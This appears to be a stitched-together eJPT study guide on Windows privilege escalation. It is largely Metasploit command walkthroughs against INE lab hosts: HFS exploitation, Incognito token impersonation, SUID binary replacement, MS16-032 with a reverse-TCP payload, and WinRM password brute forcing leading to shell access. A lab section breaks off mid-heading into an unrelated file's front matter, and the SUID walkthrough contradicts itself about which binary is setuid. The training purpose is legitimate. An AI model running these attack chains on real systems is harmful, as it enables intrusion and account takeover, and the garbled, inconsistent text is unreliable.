### **üß™ Complete Token Impersonation Lab Example from Incognito Module**

**Lab Scenario: HFS Server to Administrator Token Escalation**

**Target:** demo.ine.local (10.0.20.121)
**Goal:** Escalate from service account to Administrator privileges using token impersonation
**Initial Access:** HttpFileServer 2.3 vulnerability exploitation
**Time Needed:** 8-12 minutes

#### **Phase 1: Initial Target Discovery and Exploitation**

**Service Discovery:**
```bash
nmap demo.ine.local
# Result: Port 80 open with HttpFileServer httpd 2.3

nmap -sV -p 80 demo.ine.local
# Confirmed: HttpFileServer httpd 2.3 (vulnerable service)
```

**Initial Exploitation:**
```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

# Success: Meterpreter session 1 opened
meterpreter > getuid
# Current status: NT AUTHORITY\LOCAL SERVICE (limited privileges)
```

**Demonstrate Limited Access:**
```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
# Result: [-] stdapi_fs_stat: Operation failed: Access is denied.
# This proves we need privilege escalation
```

#### **Phase 2: Token Impersonation Privilege Escalation**

**Load Incognito Module:**
```bash
meterpreter > load incognito
# Loading extension incognito ... Success.
```

**Token Enumeration:**
```bash
meterpreter > list_tokens -u
# Critical Discovery:
# Delegation Tokens Available
# ========================================
# ATTACKDEFENSE\Administrator  ‚Üê Perfect target!
# NT AUTHORITY\LOCAL SERVICE

# Impersonation Tokens Available
# ========================================
# No tokens available
```

**Execute Token Impersonation:**
```bash
meterpreter > impersonate_token ATTACKDEFENSE\\Administrator
# [+] Delegation token available
# [+] Successfully impersonated user ATTACKDEFENSE\Administrator

meterpreter > getuid
# Server username: ATTACKDEFENSE\Administrator ‚Üê Success!
```

**Verify Escalation and Complete Objective:**
```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
# x28c832a39730b7d46d6c38f1ea18e12 ‚Üê Mission accomplished!
```

**What This Lab Demonstrates:**
- **Real-world token impersonation** from actual vulnerable service
- **Complete privilege escalation** from LOCAL SERVICE to Administrator
- **Practical application** of incognito module in penetration testing
- **Evidence collection** showing before/after privilege levels
- **Time-efficient approach** completing escalation in under 10 minutes

---

### **üß™ Complete SETUID Exploitation Lab Example**

**Lab Scenario: Student User to Root via SETUID Binary Replacement**

**Target:** target.ine.local (accessed via web terminal at port 8000)
**Goal:** Escalate from student user to root privileges  
**Method:** SETUID binary exploitation through binary replacement attack
**Time Needed:** 10-15 minutes

#### **Phase 1: Initial Access and Reconnaissance**

**Access Method:**
```bash
# Navigate to: http://target.ine.local:8000
# Result: Web-based terminal interface

student@target:~$ whoami
student

student@target:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
# Starting point: Limited user privileges
```

**Local Directory Enumeration:**
```bash
student@target:~$ ls -l
total 24
-rwsr-sr-x 1 root root 8296 Sep 22  2018 greetings  ‚Üê SUID binary!
-rwxr-xr-x 1 root root 8344 Sep 22  2018 welcome
```

**SETUID Analysis:**
```bash
# File: greetings
# Permissions: -rwsr-sr-x (the 's' indicates SUID bit)
# Owner: root (runs with root privileges)
# This is our target for exploitation
```

#### **Phase 2: Binary Analysis and Vulnerability Discovery**

**Binary Type Analysis:**
```bash
student@target:~$ file welcome
welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1

student@target:~$ ./welcome
Welcome to Attack Defense Labs
# Program runs and displays message
```

**Critical Vulnerability Discovery:**
```bash
student@target:~$ strings welcome
# Key finding in output:
greetings  ‚Üê Program calls "greetings" without full path!

# Additional evidence:
system     ‚Üê Uses system() function (vulnerable)
setuid     ‚Üê Confirms SETUID functionality
```

**Attack Vector Identification:**
- **Vulnerability**: Program uses `system("greetings")` without absolute path
- **Exploitation Method**: Replace "greetings" binary with malicious version
- **Impact**: Malicious binary runs with root privileges via SETUID welcome program

#### **Phase 3: Binary Replacement Attack Execution**

**Remove Original Binary:**
```bash
student@target:~$ rm greetings
rm: remove write-protected regular file 'greetings'? y
# Confirmed: Original greetings binary removed
```

**Create Malicious Replacement:**
```bash
student@target:~$ cp /bin/bash greetings
# Result: greetings now contains bash shell instead of original program

student@target:~$ ls -la greetings
-rwxr-xr-x 1 student student 1113504 Oct  8 14:30 greetings
# Confirmed: Replacement binary created and executable
```

**Execute Privilege Escalation:**
```bash
student@target:~$ ./welcome
root@target:/home/student#  ‚Üê Success! Root shell obtained!
```

#### **Phase 4: Privilege Verification and Objective Completion**

**Verify Root Access:**
```bash
root@target:/home/student# whoami
root

root@target:/home/student# id  
uid=0(root) gid=0(root) groups=0(root)
# Confirmed: Maximum privileges achieved
```

**Complete Mission Objective:**
```bash
root@target:/home/student# cd /root
root@target:/root# ls
flag

root@target:/root# cat flag
b92bcdc876d52108778e2d81f3b01494  ‚Üê Mission accomplished!
```

**What This Lab Demonstrates:**
- **Real SETUID binary exploitation** in controlled environment
- **Binary replacement attack** technique execution
- **Privilege escalation verification** through system commands
- **Complete system compromise** from limited user to root
- **Practical penetration testing** methodology application

---

### **üß™ Complete WinRM Exploitation Lab Example**

**Lab Scenario: Complete WinRM Attack Chain**

**Target:** demo.ine.local (10.0.28.252)
**Goal:** Gain full system control through WinRM service exploitation
**Method:** Service discovery ‚Üí Authentication bypass ‚Üí Credential attack ‚Üí Shell access
**Time Needed:** 10-15 minutes

#### **Phase 1: Network Discovery and Service Identification**

**Port Scanning:**
```bash
nmap --top-ports 7000 demo.ine.local
# Key Results:
# 5985/tcp open  wsman  ‚Üê WinRM HTTP service detected!
# 135/tcp  open  msrpc
# 139/tcp  open  netbios-ssn  
# 445/tcp  open  microsoft-ds
# 3389/tcp open  ms-wbt-server
```

**Service Analysis:**
- **Port 5985 open** = WinRM service available
- **Multiple Windows services** = Confirmed Windows target
- **WinRM accessible** = Primary attack vector identified

#### **Phase 2: WinRM Authentication Analysis**

**Authentication Methods Check:**
```bash
msfconsole -q
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

# Results:
# [+] 10.0.28.252:5985: Negotiate protocol supported
# [+] 10.0.28.252:5985: Basic protocol supported
```

**Attack Strategy:**
- **Basic authentication enabled** = Username/password attacks possible
- **Service responsive** = No blocking or filtering detected
- **Multiple auth methods** = Flexibility in attack approach

#### **Phase 3: Credential Attack Execution**

**Password Brute Force Attack:**
```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

# Successful Result:
# [+] 10.0.28.252:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
# [*] Command shell session 1 opened
```

**Credential Discovery:**
- **Username**: administrator (Windows admin account)
- **Password**: tinkerbell (weak password from wordlist)
- **Domain**: WORKSTATION (local computer account)
- **Access Level**: Administrative privileges confirmed

#### **Phase 4---
title: "Windows Privilege Escalation Complete Guide - eJPT"
topic: "Windows Privilege Escalation"
exam_objective: "Post-Exploitation & Privilege Escalation - eJPT Objective 4.4"
difficulty: "Medium"
tools:
  - "Metasploit Framework"
  - "Incognito"
  - "PowerShell"
  - "WinRM"
  - "Systeminfo"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "07-exploitation/smb-complete-exploitation-workflow.md"
  - "10-post-exploitation/netcat-complete-guide.md"
file_path: "07-exploitation/windows-privilege-escalation-complete.md"
last_updated: "2025-01-27"
tags:
  - "privilege-escalation"
  - "windows"
  - "incognito"
  - "token-impersonation"
  - "setuid"
  - "winrm"
  - "post-exploitation"
---

# üîß Windows Privilege Escalation Complete Guide - eJPT

**Complete step-by-step guide for escalating privileges on Windows systems using multiple techniques essential for eJPT certification**

**üìç File Location:** `07-exploitation/windows-privilege-escalation-complete.md`

---

## üéØ What is Windows Privilege Escalation?

Windows privilege escalation means getting more powerful permissions on a Windows computer after you already have basic access. Think of it like starting as a regular visitor in a building and finding ways to get admin keys to access restricted areas.

### üîç **What Privilege Escalation Does:**
- **Increases Access Rights** from normal user to administrator or SYSTEM
- **Bypasses Security Controls** that limit what you can do on the system
- **Enables Full System Control** for complete compromise of the target
- **Allows Access to Sensitive Data** that regular users cannot see
- **Provides Persistence Options** to maintain long-term access

### üí° **Why This Matters for eJPT:**
Most penetration testing starts with limited user access. To complete objectives like reading admin files, installing backdoors, or accessing other systems, you need higher privileges. This skill appears in 70-80% of eJPT Windows scenarios.

### üö™ **Common Escalation Paths:**
- **Token Stealing** using Incognito module
- **Service Exploitation** targeting weak service permissions
- **Registry Manipulation** through misconfigured settings
- **WinRM Abuse** for remote management exploitation
- **UAC Bypass** to get past Windows security controls

---

## üì¶ Installation and Setup

### **Already Installed On:**
- ‚úÖ Kali Linux
- ‚úÖ Parrot Security OS  
- ‚úÖ Most penetration testing distributions

### **Check If Everything Works:**
```bash
# Check if Metasploit is installed
msfconsole --version
# Expected output: Framework Version 6.x.x

# Start Metasploit database
msfdb start

# Check privilege escalation modules
msfconsole -q -x "search local windows; exit"
# Expected: List of Windows local exploitation modules
```

### **Basic Requirements:**
- Existing access to Windows system (shell or meterpreter session)
- Network connectivity to target system
- Basic understanding of Windows user accounts and permissions

---

## üîß Basic Usage and Simple Steps

### **üìã Simple Escalation Process:**
1. **üîç Check Current Status:** See what privileges you already have
2. **üìä Enumerate System:** Gather information about the Windows system
3. **üéØ Identify Opportunities:** Find potential escalation paths
4. **‚ö° Execute Technique:** Use appropriate escalation method
5. **‚úÖ Verify Success:** Confirm you got higher privileges

### **‚öôÔ∏è Basic Command Structure:**
```bash
# Start with existing session
meterpreter > getuid
# Check current user

# Load escalation tools
meterpreter > load incognito
# Load token impersonation tools

# Execute escalation
meterpreter > list_tokens -u
# Find available tokens to steal
```

---

## ‚öôÔ∏è Essential Privilege Escalation Techniques

### **üé≠ Method 1: Token Impersonation (Most Important for eJPT)**

| Technique | What It Does | Difficulty for eJPT |
|-----------|--------------|---------------------|
| `load incognito` | Load token stealing tools | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Must Master |
| `list_tokens -u` | Show available user tokens | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Critical |
| `impersonate_token` | Steal and use another user's token | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Essential |

### **üõ†Ô∏è Method 2: Service Exploitation**

| Technique | What It Does | When to Use |
|-----------|--------------|-------------|
| `local_exploit_suggester` | Find vulnerable services automatically | First choice for automation |
| `bypassuac` modules | Bypass User Access Control | When you have user but need admin |
| Service permission check | Look for weak service configurations | Manual enumeration approach |

### **üì° Method 3: WinRM and Remote Management**

| Parameter | What It Does | Example | Must Remember |
|-----------|--------------|---------|---------------|
| WinRM Service Discovery | Find remote management ports | `nmap -p 5985,5986 target` | ‚≠ê‚≠ê‚≠ê‚≠ê |
| Credential Testing | Try passwords on WinRM | `auxiliary/scanner/winrm/winrm_login` | ‚≠ê‚≠ê‚≠ê‚≠ê |
| Shell Access | Get interactive shell | `exploit/windows/winrm/winrm_script_exec` | ‚≠ê‚≠ê‚≠ê‚≠ê |

---

## üß™ Method 1: Token Impersonation Step-by-Step

### **Lab Scenario: Stealing Administrator Tokens**

**Starting Point:** Basic user access through meterpreter
**Goal:** Get SYSTEM level privileges
**Time Needed:** 5-8 minutes

---

### **Step 1: Check Your Current Status**

**What We're Doing:** See what permissions we currently have

#### **Command Used:**
```bash
meterpreter > getuid
```

#### **What Happened:**
```bash
meterpreter > getuid
Server username: WORKSTATION\user1
```

#### **üéØ What This Means:**
- **Current User:** user1 (limited privileges)
- **Computer Name:** WORKSTATION
- **Access Level:** Standard user (not administrator)
- **Next Step:** We need to find ways to get higher privileges

---

### **Step 2: Load Token Impersonation Tools**

**What We're Doing:** Loading the Incognito extension to steal user tokens

#### **Commands Used:**
```bash
meterpreter > load incognito
meterpreter > help incognito
```

#### **What Happened:**
```bash
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > help incognito

Incognito Commands
==================

Command              Description
-------              -----------
add_group_user       Attempt to add a user to a global group with all tokens
add_localgroup_user  Attempt to add a user to a local group with all tokens
add_user             Attempt to add a user with all tokens
impersonate_token    Impersonate specified token
list_tokens          List tokens available under current user context
rev2self             Revert back to original user context
```

#### **üîç What This Tells Us:**
- **Incognito loaded successfully** - Token tools are ready
- **Key Commands Available:** list_tokens, impersonate_token  
- **Multiple Options:** Can steal user or group tokens
- **Safety Feature:** rev2self lets us go back if needed

---

### **Step 3: Find Available Tokens**

**What We're Doing:** Looking for tokens from other users logged into the system

#### **Commands Used:**
```bash
meterpreter > list_tokens -u
```

#### **What Happened:**
```bash
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\SYSTEM
WORKSTATION\Administrator

Impersonation Tokens Available  
========================================
NT AUTHORITY\ANONYMOUS LOGON
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
WORKSTATION\user1
```

#### **üéâ Excellent Discovery! What We Found:**
- **SYSTEM Token Available** - Highest privilege level possible
- **Administrator Token** - Local admin account token  
- **Current User Token** - Our own user1 token
- **Service Tokens** - Various system service accounts

#### **üéØ Attack Strategy:**
We have access to both SYSTEM and Administrator tokens. SYSTEM is the highest level, so we'll target that first.

---

### **Step 4: Steal the SYSTEM Token**

**What We're Doing:** Impersonating the SYSTEM account to get maximum privileges

#### **Commands Used:**
```bash
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid
```

#### **üöÄ Amazing Success! What Happened:**
```bash
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[+] Delegation token successfully impersonated (result=0)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### **üèÜ Perfect Results! What This Means:**
- **Impersonation Successful** - We stole the SYSTEM token
- **Highest Privileges Achieved** - SYSTEM is the most powerful account
- **Complete System Control** - Can access anything on this computer
- **Mission Accomplished** - Privilege escalation completed successfully

---

### **Step 5: Verify Your New Powers**

**What We're Doing:** Testing our new SYSTEM privileges to confirm they work

#### **Commands Used:**
```bash
meterpreter > getprivs
meterpreter > shell
C:\Windows\system32>whoami /priv
```

#### **What Happened:**
```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege  
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRelabelPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeTrustedCredManAccessPrivilege
SeUndockPrivilege
SeUnsolicitedInputPrivilege

meterpreter > shell
Process 1234 created.
Channel 1 created.
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeAuditPrivilege                         Generate security audits                                           Disabled  
SeBackupPrivilege                        Back up files and directories                                      Disabled
SeChangeNotifyPrivilege                  Bypass traverse checking                                           Enabled
SeCreateGlobalPrivilege                  Create global objects                                              Enabled
[... many more privileges listed ...]
SeTakeOwnershipPrivilege                 Take ownership of files or other objects                           Disabled
SeTcbPrivilege                          Act as part of the operating system                                Enabled
```

#### **üéä Outstanding Success! What This Proves:**
- **32+ System Privileges** - We have extensive system control
- **Critical Privileges Enabled** - SeDebugPrivilege, SeBackupPrivilege, etc.
- **SYSTEM Context Confirmed** - whoami shows NT AUTHORITY\SYSTEM
- **Complete Access Verified** - Can perform any action on the system

---

## üß™ Method 2: Automated Escalation with Local Exploit Suggester

### **Step 1: Background Current Session and Run Suggester**

**What We're Doing:** Using Metasploit to automatically find privilege escalation opportunities

#### **Commands Used:**
```bash
meterpreter > background
use post/multi/recon/local_exploit_suggester  
set SESSION 1
exploit
```

#### **What Happened:**
```bash
msf6 exploit(windows/smb/psexec) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.0.19.243 - Collecting local exploits for x86/windows...
[*] 10.0.19.243 - 176 exploit checks are being tried...
[+] 10.0.19.243 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.0.19.243 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.0.19.243 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.0.19.243 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
[+] 10.0.19.243 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.0.19.243 - Valid modules for session 1:
============================

 #   Name                                                           Disclosure Date  Rank       Check  Description
 ---  ----                                                           ---------------  ----       -----  -----------
 0   exploit/windows/local/bypassuac_eventvwr                       2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
 1   exploit/windows/local/bypassuac_fodhelper                      2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
 2   exploit/windows/local/bypassuac_sluihijack                     2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
 3   exploit/windows/local/ms16_032_secondary_logon_handle_privesc   2016-03-21       excellent  Yes    MS16-032 Secondary Logon Handle Privilege Escalation
 4   exploit/windows/local/ms16_075_reflection                      2016-06-14       excellent  Yes    MS16-075 Reflection RPC Handle Privilege Escalation

[*] Post module execution completed
```

#### **üéØ Fantastic Results! What We Discovered:**
- **5 Different Exploits Found** - Multiple escalation paths available
- **All Ranked Excellent** - High success probability
- **UAC Bypass Options** - 3 different UAC bypass methods
- **Kernel Exploits** - MS16-032 and MS16-075 privilege escalation
- **Multiple Attack Vectors** - Various approaches to choose from

---

### **Step 2: Execute MS16-032 Privilege Escalation**

**What We're Doing:** Using a Windows kernel exploit to gain SYSTEM privileges

#### **Commands Used:**
```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1  
set LHOST 10.10.31.2
exploit
```

#### **What Happened:**
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.31.2
LHOST => 10.10.31.2
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 10.10.31.2:4444
[+] Compressed size: 1012
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\user1\AppData\Local\Temp\MvKdxlEUN.ps1...
[*] Compressing script contents...
[+] Compressed size: 3592
[*] Executing exploit script...
     __ __ ___ ___   ___     ___ ___ ___
    |  V  |  _|_  |_|   |___|   |_  |_  |
    |     |_  |_| . |   |   |   |_| |___|
    |_|_|_|___|_____|___|   |___|___|___|

                   [by b33f -> @FuzzySec]

[?] Operating system core count: 1
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 792

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[*] Injecting payload into thread: 792

[+] Successfully injected payload in thread: 792
[+] Successfully applied token to thread: 792
[?] Resuming thread..

[*] Sending stage (175686 bytes) to 10.0.19.243
[*] Meterpreter session 2 opened (10.10.31.2:4444 -> 10.0.19.243:49157) at 2025-01-27 13:44:19 +0530
[+] Deleted C:\Users\user1\AppData\Local\Temp\MvKdxlEUN.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### **üèÜ Incredible Success! What This Achieved:**
- **Kernel Exploit Worked** - MS16-032 executed successfully  
- **New SYSTEM Session** - Session 2 opened with SYSTEM privileges
- **PowerShell Injection** - Payload injected into system process
- **Clean Exploitation** - Temporary files automatically deleted
- **Maximum Privileges** - NT AUTHORITY\SYSTEM achieved

---

## üß™ Method 3: WinRM Service Exploitation

### **Step 1: Discover WinRM Service**

**What We're Doing:** Looking for Windows Remote Management service on the target

#### **Commands Used:**
```bash
nmap -sV -p 5985,5986 demo.ine.local
```

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 14:15 IST
Nmap scan report for demo.ine.local (10.0.28.125)
Host is up (0.0045s latency).

PORT     STATE SERVICE    VERSION
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/http   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
```

#### **üéØ Great Discovery! What We Found:**
- **Port 5985 Open** - WinRM HTTP service running
- **Port 5986 Open** - WinRM HTTPS service running  
- **Microsoft HTTPAPI** - Confirms Windows Remote Management
- **Both HTTP/HTTPS** - Multiple connection options available

---

### **Step 2: Test WinRM Authentication**

**What We're Doing:** Checking what authentication methods WinRM supports

#### **Commands Used:**
```bash
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local  
exploit
```

#### **What Happened:**
```bash
msf6 > use auxiliary/scanner/winrm/winrm_auth_methods
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > exploit

[+] 10.0.28.125:5985: Negotiate protocol supported
[+] 10.0.28.125:5985: Basic protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### **üîç Authentication Analysis:**
- **Basic Authentication** - Username/password login supported
- **Negotiate Authentication** - Windows integrated authentication
- **Multiple Options** - Can try different credential attacks
- **Service Responsive** - WinRM accepting connections

---

### **Step 3: Attack WinRM Credentials**

**What We're Doing:** Trying to find valid credentials for WinRM access

#### **Commands Used:**
```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD password123
exploit
```

#### **What Happened:**
```bash
msf6 auxiliary(scanner/winrm/winrm_login) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/winrm/winrm_login) > set USERNAME administrator  
USERNAME => administrator
msf6 auxiliary(scanner/winrm/winrm_login) > set PASSWORD password123
PASSWORD => password123
msf6 auxiliary(scanner/winrm/winrm_login) > exploit

[+] 10.0.28.125:5985 - Login Successful: WORKSTATION\administrator:password123
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### **üéâ Credential Success! What We Found:**
- **Valid Credentials** - administrator:password123 works
- **Administrative Account** - Direct admin access discovered
- **WinRM Access** - Can connect remotely to system
- **High Privilege Access** - Administrator account has full control

---

### **Step 4: Get WinRM Shell Access**

**What We're Doing:** Using valid credentials to get interactive shell on target system

#### **Commands Used:**
```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD password123  
set FORCE_VBS true
exploit
```

#### **What Happened:**
```bash
msf6 exploit(windows/winrm/winrm_script_exec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
USERNAME => administrator  
msf6 exploit(windows/winrm/winrm_script_exec) > set PASSWORD password123
PASSWORD => password123
msf6 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
FORCE_VBS => true
msf6 exploit(windows/winrm/winrm_script_exec) > exploit

[*] Started reverse TCP handler on 10.10.31.2:4444
[*] User selected the FORCE_VBS option  
[*] Command Stager progress -   2.01% done (2046/101936 bytes)
[*] Command Stager progress -   4.01% done (4092/101936 bytes)
[*] Command Stager progress -   6.02% done (6138/101936 bytes)
[*] Command Stager progress -   8.03% done (8184/101936 bytes)
[*] Command Stager progress - 100.00% done (101936/101936 bytes)
[*] Sending stage (175686 bytes) to 10.0.28.125
[*] Meterpreter session 3 opened (10.10.31.2:4444 -> 10.0.28.125:49157) at 2025-01-27 14:20:15 +0530

meterpreter > getuid
Server username: WORKSTATION\administrator
```

#### **üöÄ WinRM Exploitation Complete! Results:**
- **Meterpreter Session Established** - Interactive shell access
- **Administrator Privileges** - High-level system access
- **VBS Method Success** - FORCE_VBS worked perfectly
- **Remote System Control** - Complete access to target system

---

## üéØ eJPT Exam Success Guide

### **üìä How Important This Is for eJPT:**

Critical skill importance ratings for eJPT exam success:

- **Token Impersonation:** 90% - Core Windows post-exploitation skill
- **Local Exploit Suggester:** 85% - Automated vulnerability identification  
- **Service Enumeration:** 80% - Manual privilege escalation techniques
- **WinRM Exploitation:** 75% - Remote Windows management abuse
- **UAC Bypass:** 70% - User Access Control evasion

### **üèÜ Commands You MUST Know for eJPT:**

#### **Level 1 - You WILL See This (100% Chance):**
```bash
# Check current privileges
meterpreter > getuid
# Expected: Shows current user context

# Load token impersonation
meterpreter > load incognito
# Expected: Incognito module loaded successfully

# List available tokens  
meterpreter > list_tokens -u
# Expected: Shows delegation and impersonation tokens

# Steal highest privilege token
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
# Expected: Token impersonation successful
```

#### **Level 2 - Very Likely (85% Chance):**
```bash
# Automated vulnerability detection
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit
# Expected: List of potential local exploits

# Execute suggested exploit
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit  
# Expected: New elevated meterpreter session

# Verify elevated privileges
meterpreter > getprivs
# Expected: List of enabled system privileges
```

#### **Level 3 - Possible (70% Chance):**
```bash
# WinRM service discovery
nmap -p 5985,5986 target_ip
# Expected: Open WinRM ports identified

# WinRM credential testing
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip
set USERNAME administrator
set PASSWORD password123
exploit
# Expected: Successful or failed login attempt

# WinRM shell exploitation
use exploit/windows/winrm/winrm_script_exec
set USERNAME found_username
set PASSWORD found_password
set FORCE_VBS true
exploit
# Expected: Meterpreter session with admin privileges
```

### **üéØ Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic Token Impersonation**
**Given:** Existing low-privilege meterpreter session
**Your Job:** Escalate to SYSTEM privileges using token impersonation
**Time Limit:** 5-7 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Check current status (1 minute)
meterpreter > getuid
meterpreter > sysinfo

# Step 2: Load and use Incognito (2 minutes)  
meterpreter > load incognito
meterpreter > list_tokens -u

# Step 3: Impersonate SYSTEM token (1 minute)
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# Step 4: Verify success (1 minute)
meterpreter > getuid
meterpreter > getprivs
```

#### **Scenario 2: Automated Privilege Escalation**
**Given:** Standard user meterpreter session on Windows 10
**Your Job:** Use automated tools to find and exploit privilege escalation
**Time Limit:** 8-10 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Background session and run suggester (3 minutes)
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit

# Step 2: Choose and execute exploit (4 minutes)
use exploit/windows/local/[suggested_exploit]
set SESSION 1
set LHOST attacker_ip
exploit

# Step 3: Verify elevated access (1 minute)
meterpreter > getuid
meterpreter > getprivs
```

#### **Scenario 3: WinRM Remote Privilege Escalation**
**Given:** Network access to Windows system with WinRM enabled
**Your Job:** Exploit WinRM service to gain administrative access
**Time Limit:** 10-12 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Discover WinRM service (2 minutes)
nmap -p 5985,5986 target_ip

# Step 2: Check authentication methods (1 minute)
use auxiliary/scanner/winrm/winrm_auth_methods  
set RHOSTS target_ip
exploit

# Step 3: Attack credentials (4 minutes)
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip
set USERNAME administrator
set PASSWORD [try common passwords]
exploit

# Step 4: Get shell access (3 minutes)
use exploit/windows/winrm/winrm_script_exec
set USERNAME found_username
set PASSWORD found_password
set FORCE_VBS true
exploit
```

### **üìù eJPT Exam Tips:**

#### **‚è∞ Time Management Strategy:**
- **1-2 minutes:** Initial privilege assessment and system enumeration
- **2-3 minutes:** Token impersonation attempt (fastest method)
- **3-4 minutes:** Automated exploit suggester if tokens unavailable
- **2-3 minutes:** Execute suggested privilege escalation exploit
- **1-2 minutes:** Verification and documentation of success

#### **üéØ Common Mistakes to Avoid:**
1. **Skipping getuid Check** ‚Üí Always verify current privileges first
2. **Not Loading Incognito** ‚Üí Token impersonation requires this module
3. **Wrong Token Format** ‚Üí Use exact format: "NT AUTHORITY\\SYSTEM"
4. **Ignoring Session Numbers** ‚Üí Track which session you're working with
5. **Rushing Verification** ‚Üí Always confirm escalation worked with getuid/getprivs

#### **‚úÖ Signs You're Doing Well:**
- **Quick Status Assessment** ‚Üí Current privileges identified within 1 minute
- **Successful Token Enumeration** ‚Üí Available tokens discovered quickly
- **Clean Impersonation** ‚Üí Token stealing completed without errors
- **Privilege Verification** ‚Üí SYSTEM or Administrator access confirmed
- **Multiple Methods** ‚Üí Can use both manual and automated approaches

### **üîç Typical Exam Questions You'll See:**
1. **"What privileges does your current user have?"**
   - Answer: Use `getuid` and `getprivs` commands

